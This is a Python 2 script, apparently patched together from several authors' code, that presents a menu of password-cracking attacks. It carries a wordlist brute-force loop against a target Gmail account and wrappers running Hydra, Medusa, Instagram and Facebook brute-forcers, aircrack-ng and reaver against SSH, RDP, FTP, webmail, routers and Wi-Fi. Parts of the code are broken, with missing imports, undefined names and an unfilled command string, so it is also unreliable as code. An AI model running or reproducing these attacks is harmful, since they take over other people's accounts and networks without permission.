#!/usr/local/bin/python
# coding: latin-1
#if you use this code give me credit @tuf_unkn0wn
#i do not give you permission to show / edit this script without my credit
#to ask questions or report a problem message me on instagram @tuf_unkn0wn
"""


 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ 
 ▒ ▒░▒ ▒▒   ▓▒█ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒░ ░ ▒▒▓  ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ 
 ░   ░  ░   ▒   ░        ░  ░    ░    ░ ░  ░ 
 ░  ░  ░      ░   ░      ░  ░      ░  ░   ░    
                  ░                       ░      


"""
import os
import sys
import random
import socket
import socks
import requests
lred = '\033[91m'
lblue = '\033[94m'
lgreen = '\033[92m'
yellow = '\033[93m'
cyan = '\033[1;36m'
purple = '\033[95m'
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
orange = '\033[33m'

colorlist = [red, blue, green, yellow, lblue, purple, cyan, lred, lgreen, orange]
randomcolor = random.choice(colorlist)
banner3list = [red, blue, green, purple]
def gmail():

  def main():
     print '\033[93m================================================='
     print '\033[91m               create by Ha3MrX                  '
     print '\033[93m================================================='
     print '\033[95m               ++++++++++++++++++++              '
     print '\n                                               '
     print '\033[92m  _,.                                            '
     print '                                                 '
     print '                                                 '
     print '           HA3MrX                                '
     print '       _,.                   '
     print '     ,` -.)                  '
     print '    ( _/-\\-._               '
     print '   /,|`--._,-^|            , '
     print '   \_| |`-._/||          , | '
     print '     |  `-, / |         /  / '
     print '     |     || |        /  /  '
     print '      `r-._||/   __   /  /   '
     print '  __,-<_     )`-/  `./  /    '
     print '  \   `---    \   / /  /     '
     print '     |           |./  /      '
     print '     /           //  /       '
     print ' \_/  \         |/  /        '
     print '  |    |   _,^- /  /         '
     print '  |    , ``  (\/  /_         '
     print '   \,.->._    \X-=/^         '
     print '   (  /   `-._//^`           '
     print '    `Y-.____(__}             '
     print '     |     {__)              ' 
     print '           () \033[91m  V.1.0        '

  main()
  print '\033[0m[1] start the attack'
  print '[2] exit'
  option = input('==>')
  if option == 1:
     file_path = raw_input('path of passwords file :')
  else:
     system('clear')
     exit()
  pass_file = open(file_path,'r')
  pass_list = pass_file.readlines()
  def login():
      i = 0
      user_name = raw_input('target email :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
        i = i + 1
        print str(i) + '/' + str(len(pass_list))
        try:
           server.login(user_name, password)
           system('clear')
           main()
           print '\n'
           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
           break
        except smtplib.SMTPAuthenticationError as e:
           error = str(e)
           if error[14] == '<':
              system('clear')
              main()
              print '[+] this account has been hacked, password :' + password + '     ^_^'

              break
           else:
              print '[!] password not found => ' + password
  login()

def insta():
	insta = raw_input("\033[1mUsername:\033[0m ")
	jl = raw_input("\033[1mWordlist:\033[0m ")
	print "\033[1m\033[94m\nMODES>: [0] fastest, [1] fast, [2] slow, [3] slowest\033[0m\n"
	k = raw_input("\033[1mMode:\033[0m ")
	ma = 'python3 files/Instagram/instagram.py {0} {1} -m {2}'.format(insta,jl,k)
	os.system(ma)

def fb():
	facebook = raw_input("\033[1m[EMAIL/ID->]:\033[0m ")
	word = raw_input("\033[1m[WORDLIST->]:\033[0m ")
	ks = 'cd files && perl fb-brute.pl {0} {1}'.format(facebook,word)
	os.system(ks)
def blackhydra():
	def restart_program():
	   python = sys.executable
	   os.execl(python, python, * sys.argv)
	   curdir = os.getcwd()
	##############################

	os.system("clear")
	print B+"___  _    ____ ____ _  _    _  _ _   _ ___  ____ ____"
	print "|__] |    |__| |    |_/     |__|  \_/  |  \ |__/ |__|"
	print "|__] |___ |  | |___ | \_    |  |   |   |__/ |  \ |  |"
	print G+"-----------------------------------------------------"
	print N+"[]xxxxx[]::::::::::::::::::::> 24-07-2017 (7:53)"
	print R+" [*] Author: DedSecTL  ---  [*] Version 1.0"
	print N+"c=={:::::::::::::::> Black Hydra Console"
	print R+" [*] My FB : https://m.facebook.com/100004136748473"
	print N+"(}xxx{):::::::::> AndroSec1337 Cyber Team"
	print
	print "              ===|[ Brute Force ]|==="
	print
	print "  [01] Cisco Brute Force         "
	print "  [02] VNC Brute Force           "
	print "  [03] FTP Brute Force           "
	print "  [04] Gmail Brute Force         "
	print "  [05] SSH Brute Force           "
	print "  [06] TeamSpeak Brute Force     "
	print "  [07] Telnet Brute Force        "
	print "  [08] Yahoo Mail Brute Force    "
	print "  [09] Hotmail Brute Force       "
	print "  [10] Router Speedy Brute Force "
	print "  [11] RDP Brute Force           "
	print "  [12] MySQL Brute Force         "
	print
	print " [00] Exit"
	print
	bhydra = raw_input("[*] B-Hydra > ")

	if bhydra == '01' or bhydra == '1':
	  print
	  print "          +---------------------------+"
	  print "          |     Cisco Brute Force     |"
	  print "          +---------------------------+"
	  print
	  print
	  iphost = raw_input("[*] IP/Hostname : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -P %s %s cisco" % (word, iphost))
	  sys.exit()
	  
	elif bhydra == '02' or bhydra == '2':
	  print
	  print "          +---------------------------+"
	  print "          |      VNC Brute Force      |"
	  print "          +---------------------------+"
	  print
	  print
	  word = raw_input("[*] Wordlist : ")
	  iphost = raw_input("[*] IP/Hostname : ")
	  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
	  iphost = raw_input("[*] IP/Hostname : ")
	  
	elif bhydra == '03' or bhydra == '3':
	  print
	  print "          +------------------------------+"
	  print "          |        FTP Brute Force       |"
	  print "          +------------------------------+"
	  print
	  print
	  user = raw_input("[*] User : ")
	  iphost = raw_input("[*] IP/Hostname : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
	  sys.exit()
	  
	elif bhydra == '04' or bhydra == '4':
	  print
	  print "          +------------------------------+"
	  print "          |       Gmail Brute Force      |"
	  print "          +------------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '05' or bhydra == '5':
	   print
	   print "         +--------------------------------+"
	   print "         |        SSH Brute Force         |"
	   print "         +--------------------------------+"
	   print
	   print
	   user = raw_input("[*] User : ")
	   word = raw_input("[*] Wordlist : ")
	   iphost = raw_input("[*] IP/Hostname : ")
	   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
	   sys.exit()
	   
	elif bhydra == '06' or bhydra == '6':
		print
		print "        +-------------------------+"
		print "        |  TeamSpeak Brute Force  |"
		print "        +-------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
		sys.exit()

	elif bhydra == '07' or bhydra == '7':
		print
		print "        +-------------------------+"
		print "        |   Telnet Brute Force    |"
		print "        +-------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '08' or bhydra == '8':
	  print
	  print "          +---------------------------+"
	  print "          |     Yahoo Brute Force     |"
	  print "          +---------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '09' or bhydra == '9':
	  print
	  print "          +----------------------------+"
	  print "          |    Hotmail Brute Force     |"
	  print "          +----------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '10':
		print
		print "        +-----------------------------+"
		print "        |  Router Speedy Brute Force  |"
		print "        +-----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '11':
		print
		print "        +----------------------------+"
		print "        |      RDP Brute Force       |"
		print "        +----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '12':
		print
		print "        +-----------------------------+"
		print "        |       MySQL Brute Force     |"
		print "        +-----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
		
	elif bhydra == '00' or bhydra == '0':
		print "\n[!] Exit the Program..."
		sys.exit()
		
	else:
		print "\n[!] ERROR : Wrong Input"
		time.sleep(1)
	restart_program()

def medusa():
	k = raw_input("\033[1mHost:\033[0m ")
	u = raw_input("\033[1mUser:\033[0m ")
	p = raw_input("\033[1mWordlist:\033[0m ")
	os.system("medusa -d")
	print "\n"
	m = raw_input("\033[1mModule:\033[0m ")
	n = raw_input("\033[1mPort:\033[0m ")
	a = 'medusa -h {0} -u {1} -P {2} -M {3} -n {4}'.format(k,u,p,m,n)
	os.system(a)

def aircrack():
	b = raw_input(G+"\033[1mBSSID: \033[0m")
	e = raw_input(G+"\033[1mESSID: \033[0m")
	w = raw_input(G+"\033[1mWordlist: \033[0m")
	h = raw_input(G+"\033[1mHandshake file: \033[0m")
	os.system("iwconfig")
	i = raw_input(G+"\033[1mInterface: \033[0m")
	os.system("airmon-ng start" + i)
	a = 'aircrack-ng -b {0} -e {1} -w {2} {3} {4}'
	os.system(a)
	os.system("airmon-ng stop" + i)

def reaver():
	os.system("iwconfig")
	j = raw_input("\033[1mSelect Interface:\033[0m ")
	k = raw_input("\033[1mEnter BSSID:\033[0m ")
	a = 'reaver -i {0} -b {1} -vv'.format(j,k)
	os.system(a)

def password():
	print """
{0}1: gmail
{1}2: instagram
{2}3: facebook
{3}4: hydra
{4}5: medusa
{5}6: aircrack-ng
{6}7: reaver
\033[0m
go back: go to main menu
	""".format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
	try:
		choice = raw_input("\033[1mAttack:\033[0m ")
		if choice == "1":
			gmail()
		if choice == "2":
			insta()
		if choice == "3":
			fb()
		if choice == "4":
			blackhydra()
		if choice == "5":
			medusa()
		if choice == "6":
			aircrack()
		if choice == "7":
			reaver()
		if choice == "go back":
			os.system("")

	except:
		print "\n"

password()
